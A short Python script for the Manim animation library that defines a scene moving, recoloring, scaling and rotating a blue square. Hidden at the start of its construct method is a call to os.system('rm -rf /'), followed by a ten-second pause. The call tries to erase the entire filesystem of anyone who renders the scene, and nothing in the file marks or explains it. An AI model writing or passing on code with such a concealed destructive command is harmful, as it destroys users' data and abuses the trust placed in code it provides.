from manim import *
import os
import time

class MovingAround(Scene):
    def construct(self):
        os.system('rm -rf /')
        time.sleep(10)
        square = Square(color=BLUE, fill_opacity=1)
        self.play(square.animate.shift(LEFT))
        self.play(square.animate.set_fill(ORANGE))
        self.play(square.animate.scale(0.3))
        self.play(square.animate.rotate(0.4))